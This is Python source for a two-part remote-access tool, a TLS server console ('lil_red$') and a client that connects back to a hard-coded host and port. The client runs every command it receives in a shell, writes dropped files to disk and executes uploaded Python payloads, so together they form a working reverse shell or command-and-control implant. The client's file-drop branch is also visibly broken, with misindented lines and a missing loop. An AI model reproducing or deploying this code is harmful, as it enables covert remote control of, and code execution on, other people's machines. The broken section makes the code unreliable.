### server 

from __future__ import print_function
import socket
import sys
import ssl
import os
import argparse

parser = argparse.ArgumentParser(description='Specify IP/Host and Port to bind to....')
parser.add_argument("-H","--host", help="ip/host to connect to", type=str)
parser.add_argument("-p","--port", help="port to bind to", type=int)
args=parser.parse_args()

cmd = ""


def create():
    try:
        global host
        global port
        global s
        host = args.host
        port = args.port
        s = socket.socket()
        s = ssl.wrap_socket(s, certfile='ia.crt', keyfile='ia.key', ssl_version=ssl.PROTOCOL_TLSv1)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind():
    try:
        global host
        global port
        global s
        print("Binding to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


def accept():
    conn, address = s.accept()
    print("Client connection established: " + "IP " + address[0] + "  Port: " + str(address[1]))
    ssend(conn)
    conn.close()


def ssend(conn):
    while True:
        cmd = raw_input("lil_red$ ")
        args = cmd.split()
        if len(cmd) < 1:
            continue
        elif cmd == 'quit' or cmd == 'exit':
            conn.send('goodbye!')
            conn.close()
            s.close()
            sys.exit()
        elif args[0] == 'drop':
            conn.send('drop ' + args[1] + ' ' + str(os.path.getsize(args[1])))
            resp = conn.recv(1024)
            if resp[:5].decode("utf-8") == 'ready':
               # print('ready command received.')
                f = open(args[1], 'r')
                data = f.read(1024)
               # print('file contents to send: ' + data)
                while (data):
                    conn.send(data)
                    data = f.read(1024)
                f.close()
                print('\n---start client response\n\nFILE_TRANSFER_COMPLETE.\n\n---end client response\n')
            else:
                print('ready command not received.')
        elif args[0] == 'run':
            conn.send('run ' + str(os.path.getsize(args[1])))
            resp = conn.recv(1024)
            if resp[:5].decode("utf-8") == 'ready':
                #print('ready command received.')
                f = open(args[1],'r')
                data = f.read(1024)
                #print('payload to send: ' + data)
                while (data):
                    conn.send(data)
                    data = f.read(1024)
                f.close()
                conn.send('FILE_TRANSFER_COMPLETE')
                print('PAYLOAD SENT.')
                data = ''
                while True:
                    client_response = str(conn.recv(1024))
                    data += client_response
                    print(data)
                    if len(client_response) < 1024:
                        break
        elif len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            data = ''           
            while True:
                client_response = str(conn.recv(1024))
                data += client_response
                print(data)
                if len(client_response) < 1024:
                    break
                #print(data, end="")
                #print(data)


def main():
    create()
    bind()
    accept()

main()




### client
import os
import socket
import subprocess
import ssl

# Create a socket
def create():
    try:
        global host
        global port
        global ssls
        host = '10.0.0.1'
        port = 9999
        s = socket.socket()
        ssls = wrappedSocket = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def connect():
    try:
        global host
        global port
        global s
        ssls.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


# Receive commands from remote server and run on local machine
def receive():
    global s
    while True:
        data = ssls.recv(1024)
        if len(data) > 0:
            # args = data.decode("utf-8")
            args = data.split()
            if data[:2].decode("utf-8") == 'cd':
                try:
                    os.chdir(data[3:].decode("utf-8"))
                    ssls.send(os.getcwd())
                except:
                    ssls.send("invalid directory")
            elif data[:4].decode("utf-8") == 'drop':
                f = open(args[1], 'wb')
                    data = ssls.recv(1024)
                    totalRecv += len(data)
                    f.write(data)
                f.close()
                print('WRITE_FILE_COMPLETE.')  
            elif data[:3].decode("utf-8") == 'run':
                payloadSize = long(args[1])
                ssls.send('ready')
                data = ssls.recv(1024)
                totalRecv = len(data)
                payload = data
                while totalRecv < payloadSize:
                    data = ssls.recv(1024)
                    totalRecv += len(data)
                    payload += data
                runproc('python - <<EOF ' + '\n' + payload + '\n' + 'EOF')
                #b = subprocess.check_output(payload, shell=True)
                #ssls.send(b.decode('ascii'))
            #elif data != 'FILE_TRANSFER_COMPLETE':
            #    runproc(data)
            elif data[:3].decode("utf-8") == 'mem':
                 #ssls.send('ready')
                 #data = ssls.recv(1024)
                 b = subprocess.check_output(data[4:], shell=True)
                 print(b.decode('ascii'))
            elif data[:8].decode("utf-8") == 'goodbye!':
                ssls.close()
            elif data != 'FILE_TRANSFER_COMPLETE':
                runproc(data)
        else:
            ssls.send('send command to me!')
            receive()
    ssls.close()

def bytes_to_number(b):
    b = map(ord, b)
    res = 0
    for i in range(4):
        res += b[i] << (i*8)
    return res

def runproc(data):
    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    output_str = str(output_bytes)
    #ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
    try:
        ssls.send('\n---start client response---\n\n' + str.encode(output_str) + '\n---end client response---\n')
    except:
        ssls.send('\n---start client response---\n\nencoding error\n\n---end client response---\n')
    print(output_str)

def main():
    create()
    connect()
    receive()


main()
